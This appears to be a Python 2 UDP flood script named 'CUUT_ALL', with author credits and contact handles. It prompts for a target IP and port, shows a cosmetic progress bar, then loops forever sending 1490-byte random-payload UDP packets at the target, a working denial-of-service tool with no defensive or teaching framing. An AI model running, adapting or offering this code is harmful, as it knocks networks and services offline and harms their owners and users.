import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")
os.system("figlet CUUT_ALL")
print
print "Author   : NatSo 50"
print "github   : https://github.com/natso500"
print "Email    : natsonatso50@gmail.com"
print "follw me instagram  :  @s.1.aj"
ip = raw_input("IP Raoter : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Starte")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     print "Sent %s cut to %s and port:%s"%(sent,ip,port)
     
